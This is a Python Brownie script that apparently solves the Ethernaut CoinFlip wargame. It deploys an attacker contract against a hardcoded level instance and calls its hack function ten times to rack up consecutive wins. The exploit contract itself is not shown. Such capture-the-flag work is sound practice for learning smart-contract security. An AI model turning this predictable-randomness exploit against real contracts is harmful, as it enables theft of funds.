from scripts.helpful_scripts import get_account
from brownie import accounts, config, interface, Attack_CoinFlip, network


def main():
    ethernaut_instance = "0x08b6712F4C6675DdD39Eb774be5418c138518469"

    # Ethernaut Instance
    contract = ethernaut_instance

    # Player account
    player = accounts.add(config["wallets"]["from_key"])

    # To deploy the attacker contract: To interact with the coinflip contract (i.e. Acting as a proxy)
    # Passing in coinflip_contract address for the constructor to initialise the contract.
    attack_coinflip = Attack_CoinFlip.deploy(contract, {"from": player})

    print(f"Deployed - attack address: {attack_coinflip.address}")
    coinflip_interface = interface.Icoinflip(contract)

    for i in range(10):
        attack_coinflip.hack(
            {"from": player, "gas_limit": 10000000, "allow_revert": True}
        )
        print("Consecutive wins: ", coinflip_interface.consecutiveWins())
